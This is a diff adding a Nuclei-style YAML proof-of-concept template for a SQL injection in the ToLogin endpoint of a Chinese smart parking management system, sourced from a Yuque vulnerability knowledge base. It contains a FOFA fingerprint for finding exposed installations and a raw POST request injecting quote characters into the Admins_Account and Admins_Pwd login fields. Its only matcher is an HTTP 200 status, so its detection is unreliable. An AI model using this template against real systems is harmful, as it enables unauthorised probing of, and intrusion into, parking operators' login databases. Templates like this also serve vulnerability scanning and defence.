@@ -1,0 +1,42 @@
+id: poc-kgb7l4glke8oxigw
+info:
+  name: 智能停车管理系统ToLogin存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kgb7l4glke8oxigw'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: kgb7l4glke8oxigw
+    fofa: icon_hash="938984120"
+http:
+- raw:
+  - 'POST /Login/ToLogin HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Origin:
+
+    Referer:
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Accept-Encoding: gzip, deflate
+
+    X-Requested-With: XMLHttpRequest
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Content-Length: 32
+
+
+    Admins_Account=1"&Admins_Pwd='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
